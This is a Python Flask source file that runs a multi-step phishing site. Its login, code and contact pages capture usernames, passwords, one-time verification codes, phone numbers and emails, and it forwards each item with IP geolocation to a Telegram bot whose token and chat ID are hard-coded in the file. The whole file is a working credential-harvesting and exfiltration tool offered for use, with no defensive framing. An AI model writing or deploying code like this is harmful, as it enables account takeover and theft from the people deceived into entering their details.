from flask import Flask, request, render_template, redirect, url_for
import requests
import ipapi
import os

app = Flask(__name__)

# Replace with your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '8457904685:AAHPVCkGflXFDR8TlAdEVAvDotmvZmw9cK0'
TELEGRAM_CHAT_ID = '6201590412'

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(url, data=payload)
    return response.json()

@app.route('/')
def index():
    return redirect(url_for('login_page'))

@app.route('/login_page')
def login_page():
    return render_template('login_page.html')

@app.route('/login_page', methods=['POST'])
def login_page_post():
    username = request.form['username']
    password = request.form['password']

    # Get IP location data
    ip_data = ipapi.get()
    ip = ip_data['ip']
    country = ip_data['country']
    city = ip_data['city']
    region = ip_data['region']
    timezone = ip_data['timezone']

    # Send message to Telegram
    message = (
        f"Login attempt: User {username} with password {password}\n"
        f"IP Address: {ip}\n"
        f"Country: {country}\n"
        f"City: {city}\n"
        f"Region: {region}\n"
        f"Timezone: {timezone}"
    )
    send_telegram_message(message)

    return redirect(url_for('code_page'))

@app.route('/code_page')
def code_page():
    return render_template('code_page.html')

@app.route('/code_page', methods=['POST'])
def code_page_post():
    code = request.form['code']

    # Send message to Telegram
    send_telegram_message(f"Code {code} received for verification")

    return redirect(url_for('contact_page'))

@app.route('/contact_page')
def contact_page():
    return render_template('contact_page.html')

@app.route('/contact_page', methods=['POST'])
def contact_page_post():
    phone = request.form['phone']
    email = request.form['email']
    password = request.form['password']

    # Send message to Telegram
    send_telegram_message(f"Verification completed: Phone {phone}, Email {email}, Password {password}")

    return redirect(url_for('complete'))

@app.route('/complete')
def complete():
    return render_template('complete.html')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))